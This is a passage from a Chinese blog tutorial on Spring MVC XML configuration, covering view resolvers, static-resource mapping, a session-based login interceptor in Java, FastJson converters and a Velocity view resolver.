punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>mvc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/mvc<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans.xsd    http://www.springframework.org/schema/context    http://www.springframework.org/schema/context/spring-context.xsd    http://www.springframework.org/schema/mvc    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 配置SpringMVC --></span>    <span class="token comment" spellcheck="true">&lt;!-- 1.开启SpringMVC注解模式 --></span>    <span class="token comment" spellcheck="true">&lt;!-- 简化配置：        (1)自动注册DefaultAnootationHandlerMapping,AnotationMethodHandlerAdapter        (2)提供一些列（默认加载）：数据绑定，数字和日期的format @NumberFormat, @DateTimeFormat, xml,json默认读写支持        (3)使用此标签不用配置上面的处理映射器和处理适配器（省略不写）    --></span>    <span class="token comment" spellcheck="true">&lt;!--注解方式--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span> <span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 2.静态资源默认servlet配置        (1)加入对静态资源的处理：js,gif,png        (2)允许使用"/"做整体映射     --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>default-servlet-handler</span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 3.配置jsp 显示ViewResolver --></span>    <span class="token comment" spellcheck="true">&lt;!--视图解析器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.JstlView<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/jsp/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipartResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.multipart.commons.CommonsMultipartResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>maxUploadSize<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1048576<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--可以单独配置单个handler（controller）--></span>    <span class="token comment" spellcheck="true">&lt;!-- &lt;bean id = "hello" class="com.kuang.controller.HelloController"/> --></span>    <span class="token comment" spellcheck="true">&lt;!-- 4.扫描web相关的bean --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.controller<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>此外还可以添加一些xml标签，参考 <a href="https://www.cnblogs.com/jimloveq/p/10609465.html" target="_blank" rel="noopener">Jim~Liang</a> 的博客</p><pre class=" language-xml"><code class="language-xml">设置静态资源不拦截第一种是采用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>default-servlet-handler</span> <span class="token punctuation">/></span></span>，（一般Web应用服务器默认的Servlet名称是"default"，所以这里我们激活Tomcat的defaultServlet来处理静态文件，在web.xml里配置如下代码即可：）<span class="token comment" spellcheck="true">&lt;!--　该servlet为tomcat,jetty等容器提供,将静态资源映射从/改为/static/目录，如原来访问　http://localhost/foo.css　,现在http://localhost/static/foo.css　--></span>  <span class="token comment" spellcheck="true">&lt;!-- 不拦截静态文件 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/js/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/css/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/images/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/fonts/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  第二种是采用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token punctuation">/></span></span>，资源路径，在springmvc的配置文件中加入以下代码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/javascript/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/styles/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/css/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/images/**<span class="token punctuation">"</span></span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static_resources/images/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  </code></pre><p>自定义拦截器</p><pre class=" language-xml"><code class="language-xml">SpringMVC的拦截器HandlerInterceptorAdapter对应提供了三个preHandle，postHandle，afterCompletion方法。preHandle在业务处理器处理请求之前被调用，postHandle在业务处理器处理请求执行完成后,生成视图之前执行，afterCompletion在DispatcherServlet完全处理完请求后被调用,可用于清理资源等 。所以要想实现自己的权限管理逻辑，需要继承HandlerInterceptorAdapter并重写其三个方法。首先在springmvc.xml中加入自己定义的拦截器我的实现逻辑CommonInterceptor，<span class="token comment" spellcheck="true">&lt;!--配置拦截器, 多个拦截器,顺序执行 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptors</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 匹配的是url路径， 如果不配置或/**,将拦截所有的Controller --></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/test/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.interceptor.CommonInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 当设置多个拦截器时，先按顺序调用preHandle方法，然后逆序调用每个拦截器的postHandle和afterCompletion方法 --></span>     <span class="token comment" spellcheck="true">&lt;!--也可以直接这样写就可以不拦截静态资源--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- Login interceptor --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/**<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/login<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/jq/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/css/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>exclude-mapping</span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/images/**<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.csl.mmscm.handler.LoginInterceptor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptor</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>interceptors</span><span class="token punctuation">></span></span>  </code></pre><p>CommonInterceptor .java（拦截登录）</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>  <span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Logger<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>LoggerFactory<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ModelAndView<span class="token punctuation">;</span>  <span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>handler<span class="token punctuation">.</span>HandlerInterceptorAdapter<span class="token punctuation">;</span>  <span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>util<span class="token punctuation">.</span>RequestUtil<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/**  * @author tfj  * 2014-8-1  */</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">HandlerInterceptorAdapter</span><span class="token punctuation">{</span>      <span class="token keyword">private</span> <span class="token keyword">final</span> Logger log <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>CommonInterceptor<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LAST_PAGE <span class="token operator">=</span> <span class="token string">"com.alibaba.lastPage"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/*      * 利用正则映射到需要拦截的路径         private String mappingURL;     public void setMappingURL(String mappingURL) {                    this.mappingURL = mappingURL;         }      */</span>      <span class="token comment" spellcheck="true">/**       * 在业务处理器处理请求之前被调用       * 如果返回false       *     从当前的拦截器往回执行所有拦截器的afterCompletion(),再退出拦截器链      * 如果返回true       *    执行下一个拦截器,直到所有的拦截器都执行完毕       *    再执行被拦截的Controller       *    然后进入拦截器链,       *    从最后一个拦截器往回执行所有的postHandle()       *    接着再从最后一个拦截器往回执行所有的afterCompletion()       */</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              RequestUtil<span class="token punctuation">.</span><span class="token function">saveRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 1、preHandle================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String requestUri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          String contextPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          String url <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"requestUri:"</span><span class="token operator">+</span>requestUri<span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"contextPath:"</span><span class="token operator">+</span>contextPath<span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"url:"</span><span class="token operator">+</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            String username <span class="token operator">=</span>  <span class="token punctuation">(</span>String<span class="token punctuation">)</span>request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>              log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Interceptor：跳转到login页面！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/WEB-INF/jsp/login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token keyword">else</span>              <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/**      * 在业务处理器处理请求执行完成后,生成视图之前执行的动作         * 可在modelAndView中加入数据，比如当前时间      */</span>      <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">,</span>                ModelAndView modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>             log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 2、postHandle================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>modelAndView <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//加入当前时间    </span>            modelAndView<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span><span class="token string">"var"</span><span class="token punctuation">,</span> <span class="token string">"测试postHandle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/**       * 在DispatcherServlet完全处理完请求后被调用,可用于清理资源等        *        * 当有拦截器抛出异常时,会从当前拦截器往回执行所有的拦截器的afterCompletion()       */</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>                HttpServletResponse response<span class="token punctuation">,</span> Object handler<span class="token punctuation">,</span> Exception ex<span class="token punctuation">)</span>                <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"==============执行顺序: 3、afterCompletion================"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    </code></pre><p>3.springmvc整合FastJson（fastJson可以将传输过来的数据直接转换成对象）</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>message-converters</span> <span class="token attr-name">register-defaults</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>supportedMediaTypes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>text/html;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>application/json;charset=UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>features<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>WriteMapNullValue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>QuoteFieldNames<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>WriteDateUseDateFormat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                        <span class="token comment" spellcheck="true">&lt;!-- 禁用fastjson循环引用检测 --></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>DisableCircularReferenceDetect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>message-converters</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">></span></span></code></pre><h3 id="3-定义多个视图解析器"><a href="#3-定义多个视图解析器" class="headerlink" title="3.定义多个视图解析器"></a>3.定义多个视图解析器</h3><pre class=" language-xml"><code class="language-xml"> <span class="token comment" spellcheck="true">&lt;!-- Velocity视图解析器    默认视图  --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>velocityViewResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.velocity.VelocityViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>contentType<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewNames<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>*.html<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dateToolAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>numberToolAttribute<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>toolboxConfigLocation<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/WEB-INF/velocity-toolbox.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        